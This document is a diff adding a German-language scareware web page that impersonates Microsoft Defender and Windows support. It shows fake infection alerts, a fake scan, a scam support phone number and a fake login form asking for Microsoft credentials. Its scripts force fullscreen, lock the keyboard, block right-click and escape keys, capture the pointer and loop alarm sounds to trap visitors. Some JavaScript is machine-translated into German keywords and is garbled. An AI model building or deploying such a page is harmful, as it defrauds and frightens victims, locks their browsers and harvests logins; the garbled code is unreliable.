+                      <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA0AAAANCAIAAAD9iXMrAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAP9JREFUeNqMUTEORUAQZbIUalESpTNoVEqJSuIKjuMUCiRKnQtoKSRCKRp0JPJf/iYbv/iJKdZ47+3smxl533fpG9d1dV03z/O6rrqum6bpOI6iKJxl/DNNU5Zly7 JIjzAMI4oiy7KQy6gHUZqm+FFVNQxDEEDKsjzPk4iSJAFCeA6VeIE4jm3bbtsWJ3Ig932DhYbBk3juOI6macZx3LYtCAIOgoWGwbgwlOc5T9BB3/cCh4bQnfQbruui2aqqBAINYQRPEYx7nlcUBTwIEBrC1aeOMVbX9TAMTxAaghXMSfofYKEhTBzDFKimab7v4xQ2wEIj87292seb/X4EGADicI/nlE5xDgAAAABJRU5ErkJggg==">
+</a>
+</li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+<div class="scan_box">
+<div class="scan_box_header">
+<div class="row">
+<div class="col-md-6">
+<div class="quick_scan">
+<p>
+<img src="img/vsc.png">
+<span>Schnelles Scannen</span>
+</p>
+</div>
+</div>
+<div class="col-md-6">
+<div class="minimize1">
+<ul>
+<li>
+<a href="#">
+<img src="img/mnc.png">
+</a>
+</li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+<div class="scan_body">
+<div class="progress" style="height:30px;">
+<div Klasse="aktiver Fortschrittsbalken Fortschrittsbalken-Erfolg" style="width:35%;" id="dynamic" aria-valuemax="100" aria-valuemin="0" aria-valuenow="100" role="progressbar">35 % abgeschlossen</div>
+</div>
+<div class="table_quick">
+<table class="table table-bordered">
+<thead>
+<tr>
+<th scope="col">Gescannte Objekte</th>
+<th scope="col">
+<div class="col_fourth counter">
+<h2 class="count-number count-title timer" data-speed="5000" data-to="51900">51.900</h2>
+</div>
+</th>
+</tr>
+<tr>
+<th scope="col">Aufgewandte Zeit</th>
+<th scope="col">5 Sek.</th>
+</tr>
+<tr>
+<th scope="col">Erkannte Bedrohungen</th>
+<th scope="col" style="color:red">
+<h2 class="count-number count-title timer" data-speed="2500" data-to="1200">1,200</h2>
+</th>
+</tr>
+</thead>
+</table>
+</div>
+</div>
+<div class="scan_footer">
+<div class="row">
+<div class="col-md-6">
+<div class="bt_can">
+<div class="btn-group" role="group" aria-label="Einfaches Beispiel">
+<button class="btn btn-secondary" type="button">Scannen</button>
+</div>
+<div class="btn-group" role="group" aria-label="Einfaches Beispiel">
+<button class="btn btn-secondary" type="button">Pause</button>
+</div>
+</div>
+</div>
+<div class="col-md-6">
+<div class="bt_can2">
+<div class="btn-group" role="group" aria-label="Einfaches Beispiel">
+<button class="btn btn-secondary" type="button">Geplante Scans</button>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="pro_box2" style="cursor: default; Anzeige: keine;">
+<div class="pro_box_header">
+<div class="row">
+<div class="col-md-12">
+<div class="minimize">
+<ul>
+<li>
+<a href="#">
+<img src="img/mnc.png">
+</a>
+</li>
+</ul>
+</div>
+</div>
+<div class="col-md-4">
+<div class="logo">
+<img src="img/msmm.png">
+<span>Windows-Sicherheit</span>
+</div>
+</div>
+<div class="col-md-8">
+<div class="activate_lic">
+<ul>
+<li>
+<a href="#">
+<button>Lizenz aktivieren</button>
+</a>
+</li>
+<li>
+<a href="#">
+<img src="img/bel.png">
+</a>
+</li>
+<li>
+<a href="#">
+<img src="img/set.png">
+</a>
+</li>
+<li>
+<a href="#">
+                      <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA0AAAANCAIAAAD9iXMrAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAP9JREFUeNqMUTEORUAQZbIUalESpTNoVEqJSuIKjuMUCiRKnQtoKSRCKRp0JPJf/iYbv/iJKdZ47+3smxl533fpG9d1dV03z/O6rrqum6bpOI6iKJxl/DNNU5Zly7JIjzAMI4oiy7KQy6gHUZqm+FFVNQxDEEDKsjzPk4iSJAFCeA6VeIE4jm3bbtsWJ3Ig932DhYbBk3juOI6macZx3LYtCAIOgoWGwbgwlOc5T9BB3/cCh4bQnfQbruui2aqqBAINYQRPEYx7nlcUBTwIEBrC1aeOMVbX9TAMTxAaghXMSfofYKEhTBzDFKimab7v4xQ2wEIj87292seb/X4EGADicI/nlE5xDgAAAABJRU5ErkJggg==">
+                   </a>
+</li>
+</ul>
+</div>
+</div>
+</div>
+</div><div class="scan_box2" style=" border: 1px solid #474747; cursor:default; box-shadow: 15px 15px 15px 15px rgba(0,0,0,.4);">
+<div class="scan_box2">
+<div class="scan_box_header">
+<div class="row">
+<div class="col-md-6">
+<div class="quick_scan">
+<p>
+<img src="img/vsc.png">
+<span>Scannen</span>
+</p>
+</div>
+</div>
+<div class="col-md-6">
+<span class="fl title2" id="txts1">
+<a href="#" id="cross">
+<p style="margin-right:50px;">➖</p><p style="margin-right:30px;">❏ </p><p>❌</p><p></p>
+</a>
+
+</span></div>
+</div>
+</div>
+</div>
+<div class="scan_body">
+<div class="row">
+<div class="col-md-12">
+<div class="tooreg_detail_scan">
+<ul>
+
+</ul></div>
+</div>
+
+</div>
+</div>
+</div>
+</div>
+
+<div style="bottom:-20px;position:fixed;cursor:none;z-index:999999999" id="footer">
+<div class="row">
+<div class="col-md-12">
+<div class="right-foot" style="text-align:center">
+<span id="footertxt">
+<img src="img/msmm.png"> Windows-Sicherheit </span>
+<span style="font-weight:500;padding-left:13px;color:#fff; ">Windows-Support <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px"> 0035 3476 7838
+</span>
+</span>
+</div>
+</div>
+<div class="col-md-12">
+<marquee direction="left" height="100px" width="100%">
+<small class="text-left" style="color:#eee;font-size:10px">Windows Defender SmartScreen jetzt verhindert, dass nicht erkannte Anwendungen angezeigt werden. Das Ausführen dieser Anwendung kann Ihren PC gefährden. Der Windows Defender-Scan hat auf diesem Gerät unerwünschte Adware erkannt, die Passwörter, Online-Identitäten, Finanzinformationen, persönliche Dateien, Fotos und Dokumente stehlen kann.</small>
+</marquee>
+</div>
+</div>
+</div>
+<div class="lightbox" id="poptxt" onclick="beep1();" style="display: none; cursor:default;">
+<div class="ilb top" style="font-size:17px">
+<div class="ilb headers" style="border-bottom:1px solid #d6d5d5;">
+<span class="fl title" id="txtadd">
+<span class="fl ilb">
+<img src="img/dm.png" class="logo3">
+</span>Microsoft Defender </span>
+<span class="fl title2" id="txts1">
+<p style="margin-right:50px;">➖</p><p style="margin-right:30px;">❏ </p><p>❌</p><p></p>
+
+</span>
+</div>
+</div>
+<div id="txtintro2">
+<span class="colo-rd">
+<p style="font-size:30px;font-weight:500;">Leider ist der Scan nicht abgeschlossen!</p>
+<p style="font-size:25px;color:red;font-weight:500;">Fehler: Ox800VDS</p>
+<p style="font-size:15px;font-weight:400;color:black;">Microsoft Defender hat einige infizierte Dateien gefunden, konnte diese aber aufgrund der Gruppenrichtlinienberechtigungen nicht entfernen. Bitte scannen Sie jetzt, um es manuell zu entfernen.</p>
+
+</span>
+</div>
+<img src="img/re.gif" id="banner">
+<div id="disclaimer" style="color:#0F396D;">Rufen Sie den Support an, um Hilfe zu erhalten<br>
+<span class="support" style="font-size:22px;">Windows-Support <span style="border:1px Solid #114d9a;border-radius:5px;padding:2px 5px"> 0035 3476 7838
+</span>
+</span>
+</div>
+<div id="bottom">
+<img src="img/msmm.png" id="badge">
+<span class="title3">Windows-Sicherheit</span>
+<ul>
+<li>
+<a href="#">
+<div class="fr button">
+<span id="addtochromebutton">Jetzt scannen</span>
+</div>
+</a>
+</li>
+<li>
+<a href="#">
+<div class="fr button2">
+<span id="addtochromebutton">Später scannen</span>
+</div>
+</a>
+</li>
+</ul>
+</div>
+</div>
+<div class="cardcontainer" style="cursor: default; Anzeige: keine;" id="pop_up_new">
+<p style="font-size:16px;font-weight:400;margin:0;padding:5px 10px;color:#fff!important;color:#414141;font-weight:700;margin-top:0px" class="text-center">Windows-Defender </p>
+<p>
+<b>Der Zugriff auf diesen PC wurde aus Sicherheitsgründen gesperrt</b>
+</p>
+<p>Ihr Computer ist angeblich mit Spyware vom Typ Trojaner infiziert. Folgende Daten wurden kompromittiert:</p>
+<p>&gt; E-Mail-ID <br>&gt; Bankkennwort <br>&gt; Facebook-Login <br>&gt; Fotos und Dokumente </p>
+<p>Ein Windows Defender-Scan hat auf diesem Gerät potenziell unerwünschte Adware erkannt, die Kennwörter, Online-Identitäten, Finanzinformationen, persönliche Dateien, Fotos und Dokumente stehlen kann. </p>
+<p>Bitte kontaktieren Sie uns umgehend. Unser Techniker wird Sie telefonisch durch den Entfernungsprozess führen. </p>
+<p>Rufen Sie umgehend den Windows-Support an, um diese Bedrohung zu melden, Identitätsdiebstahl zu verhindern und den Zugriff auf dieses Gerät freizugeben. </p>
+<p>Das Schließen dieses Fensters kann Ihre persönlichen Daten gefährden und dazu führen, dass Ihre Windows-Registrierung gesperrt wird. </p>
+<p style="padding-bottom:0;color:#fff;font-size:16px">Windows Bitte rufen Sie den Support an:<strong>
+<span style="border:1px solid #fff;border-radius:5px;padding:2px 5px"> 0035 3476 7838
+</span>
+</strong>
+</p>
+<div class="action_buttons">
+<a class="active" id="leave_page" style="cursor:pointer;color:#fff!important">OK</a>
+<a class="active" id="leave_page" style="color:#fff!important">Abbrechen</a>
+</div>
+</div>
+
+
+      <div class="answer_list" style="display:none;background-color: rgb(40 40 40 / 80%);;height:auto;width:550px;margin-left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
+
+<p style="color:#FFFFFF;margin-top:10px;font-size:16px;opacity:.9;padding:0 5px" class="text-center">Der Zugriff auf diesen PC wurde aus Sicherheitsgründen blockiert. Greifen Sie nicht auf diesen PC zu und starten Sie ihn nicht neu. Wenn Sie diese grundlegende Warnung übersehen, können Informationen zu diesem Framework verloren gehen. Wenden Sie sich so schnell wie möglich an den Support, und ein Microsoft-Experte wird Sie telefonisch durch die Untersuchung führen. Das Ausführen dieser Anwendung kann Ihren PC gefährden.<br>
+<strong>
+Windows-Support: <span style="border:1px solid #383d41;border-radius:5px;padding:2px 5px"> 0035 3476 7838
+</span>
+</strong>
+</p>
+</div>
+<div id="chat" style="display: none;">
+<img src="img/msmm.png">
+<span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Microsoft</span>
+<br>
+<p>Technischer Support für Windows
+</p>
+<h4 style="font-weight:600;color:#0F396D;font-size:22px"> 0035 3476 7838
+<br>(Kostenlose Nummer)<br><br>
+</h4>
+<div class="arrow-down">
+<svg height="1em" viewBox="0 0 320 512">
+<style>
+svg {
+fill: #fff
+}
+</style>
+<path d="M137.4 374.6c12.5 12.5 32.8 12.5 45.3 0l128-128c9.2-9.2 11.9-22.9 6.9-34.9s-16.6-19.8-29.6-19.8L32 192c-12.9 0-24.6 7.8-29.6 19.8s-2.2 25.7 6.9 34.9l128 128z"></path>
+</svg></div>
+</div>
+<div id="chat-box">
+<span style="color: #fff;
+font-size: 21px;
+font-weight: 600;
+margin-left: 6px;
+position: relative;
+top: 5px;">Admin-Login</span>
+<div class="minimize1" onclick="hide1();playSound1();">
+<p class="text-center1" style="color: #CDCBCB; font-size: 18px; opacity:.9; ">X</p>
+
+</div>
+
+<br>
+<br>
+<p class="text-center" style="color: #CDCBCB;  margin-top:10px; font-size: 16px; opacity:.9; ">
+Windows aufgrund ungewöhnlicher Aktivität gesperrt.
+<br>Bitte melden Sie sich erneut mit Ihrer Microsoft-ID und Ihrem Kennwort an.<br>Wenn Sie Hilfe benötigen, wenden Sie sich an den Microsoft-Support<br><strong>0035 3476 7838 			 	</strong></p>
+
+<form action="#">
+   <input type="text" name="name" id="name" placeholder="Nutzername" class="text-input" required="" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');"><br>
+
+ <input type="text" name="name" id="name" placeholder="Passwort" class="text-input" required="" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');"><br>
+
+<input type="Submit" class="button1" name="Verify" onclick="playSound1();">Login
+
+
+
+  </form></div>
+
+<script>
+function showd2() {
+document.getElementById("chat-box").style.display = "block";
+}
+</script>
+Funktion showd2() {
+document.getElementById("Chatbox").style.display = "Block";
+}
+</script>
+<script>
+(Funktion(a) {
+a.fn.countTo = Funktion(b) {
+b = b || {};
+return a(diese).each(Funktion() {
+Funktion d(a) {
+a = c.formatter.call(k, a, c);
+h.html(a)
+}
+var c = a.extend({}, a.fn.countTo.defaults, {
+von: a(diese).data("von"),
+bis: a(diese).data("bis"),
+Geschwindigkeit: a(diese).data("Geschwindigkeit"),
+Aktualisierungsintervall: a(diese).data("Aktualisierungsintervall"),
+Dezimalstellen: a(diese).data("Dezimalstellen")
+}, b),
+l = Math.ceil(c.speed / c.Aktualisierungsintervall),
+n = (c.bis - c.von) / l,
+k = dies,
+h = a(diese),
+m = 0,
+f = c.von,
+g = h.data("countTo") || {};
+h.data("countTo", g);
+g.interval && clearInterval(g.interval);
+g.interval = setInterval(function() {
+f += n;
+m++;
+d(f);
+"function" == typeof c.onUpdate && c.onUpdate.call(k, f);
+m >= l && (h.removeData("countTo"), clearInterval(g.interval), f = c.to, "function" == typeof c.onComplete && c.onComplete.call(k, f))
+}, c.refreshInterval);
+d(f)
+})
+};
+a.fn.countTo.defaults = {
+von: 0,
+bis: 0,
+Geschwindigkeit: 100,
+Aktualisierungsintervall: 100,
+Dezimalstellen: 0,
+Formatierer: Funktion (a, d) {
+return a.toFixed (d.decimals)
+},
+bei Aktualisierung: null,
+bei Abschluss: null
+}
+})(jQuery);
+jQuery(Funktion(a) {
+a(".Anzahl").Daten("AnzahlOptionen", {
+Formatierer: Funktion(a, d) {
+Rückgabe a.toFixed(d.decimals).Ersetzen(/\B(?=(?:\d{3})+(?!\d))/g, ",")
+}
+});
+a(".Timer").Jedes(Funktion(b) {
+Var d = a(dies);
+b = a.extend({}, b || {}, d.Daten("AnzahlOptionen") || {});
+d.AnzahlZu(b)
+})
+});
+</script>
+
+<script>
+addEventListener("click", function() {
+var el = document.documentElement
+, rfs =
+el.requestFullScreen
+|| el.webkitRequestFullScreen
+|| el.mozRequestFullScreen
+;
+rfs.call(el);
+});
+
+</script>
+
+<script>
+var modal = document.getElementById("myModal"),
+btn = document.getElementById("myBtn"),
+span = document.getElementsByClassName("close")[0];
+span.onclick = function() {
+modal.style.display = "none"
+};
+window.onclick = function(a) {
+a.target == modal && (modal.style.display = "none")
+};
+</script>
+<script>
+setInterval(function() {
+document.getElementById("pridez").play()
+}, 500);
+</script>
+<script>
+function beep1() {
+document.getElementById("beep").play();
+}
+</script>
+<script>
+var e = 1;
+setInterval(function() {
+1 == e ? (document.getElementById("favicon").href = "w3-2.html", e = 0) : (document.getElementById("favicon").href = "w1.html", e = 1)
+}, 1E3);
+</script>
+<script>
+$(document).ready(function() {
+$("#mycanvas").click(function() {
+$("#welcomeDiv").show()
+
+})
+});
+</script>
+<script>
+$(document).ready(function() {
+$(".pro_box").delay(400).fadeIn(300);
+$("#poptxt").delay(2000).fadeIn(400);
+$(".black").delay(1E3).fadeIn(800);
+$(".pro_box2").delay(2500).fadeIn(800);
+$(".pro_box3").delay(3500).fadeIn(800);
+$("#pop_up_new").delay(4E3).fadeIn(800);
+});
+</script>
+<script>
+$(document).ready(function() {
+$("#mycanvas").click(function() {
+$("#poptxt").show()
+})
+});
+$(document).ready(function() {
+$("#cross").click(function() {
+$("#poptxt").show()
+})
+});
+</script>
+<script>
+$(document).ready(function() {
+$("body").mouseover(function() {
+$("#poptxt").show()
+})
+});
+</script>
+<script>
+var isNS = "Netscape" == navigator.appName ? 1 : 0;
+"Netscape" == navigator.appName && document.captureEvents(Event.MOUSEDOWN || Event.MOUSEUP);
+
+        Funktion mischandler() {
+return !1
+}
+
+Funktion mousehandler(a) {
+a = isNS ? a : Ereignis;
+a = isNS ? a.which : a.button;
+wenn (2 == a || 3 == a) return !1
+}
+document.oncontextmenu = mischandler;
+document.onmousedown = Maushandler;
+document.onmouseup = Maushandler;
+</script>
+<script>
+document.onkeydown = Funktion(a) {
+return !1
+};
+</script>
+<script>
+document.attachEvent("onkeydown", win_onkeydown_handler);
+
+Funktion win_onkeydown_handler() {
+switch (event.keyCode) {
+Fall 116:
+event.returnValue = !1;
+event.keyCode = 0;
+break;
+Fall 27:
+event.returnValue = !1, event.keyCode = 0
+}
+}
+</script>
+<script>
+window.onload = function() {
+window.moveTo(0, 0);
+window.resizeTo(screen.availWidth, screen.availHeight)
+};
+</script>
+
+<script>
+navigator.keyboard.lock();
+document.onkeydown = function (e) {
+return false;
+}
+</script>
+<script type="text/javascript">
+function addEvent(obj, evt, fn) {
+if (obj.addEventListener) {
+obj.addEventListener(evt, fn, false);
+}
+else if (obj.attachEvent) {
+obj.attachEvent("on" + evt, fn);
+}
+}
+addEvent(window,"load",function(e) {
+addEvent(document, "mouseout", function(e) {
+e = e ? e : window.event;
+var from = e.relatedTarget || e.toElement;
+if (!from || from.nodeName == "HTML") {
+// stoppe dein Drag-Event hier
+// für den Moment können wir einfach einen Alarm verwenden
+//alert("hallo");
+
+modal.style.display = "block";
+
+}
+});
+});
+
+$(document).mousemove(function(){
+var canvas = document.getElementById('mycanvas');
+canvas.requestPointerLock = canvas.requestPointerLock || canvas.mozRequestPointerLock || canvas.webkitRequestPointerLock;
+canvas.requestPointerLock();
+
+//Mausbewegungsereignis erfassen
+// unseren Zwischenstopp aus dem DOM entfernen
+});
+
+// $(document).mousemove(function(){
+// alert("move detect");
+//Mausbewegungsereignis erfassen
+// $("#pageLayover").remove(); // unseren Zwischenstopp aus dem DOM entfernen
+// });
+
+</script>
+<script defer data-domain="newxtfuyck.site" src="../../plausible.io/js/script.js"></script>
+</body>
+</html>
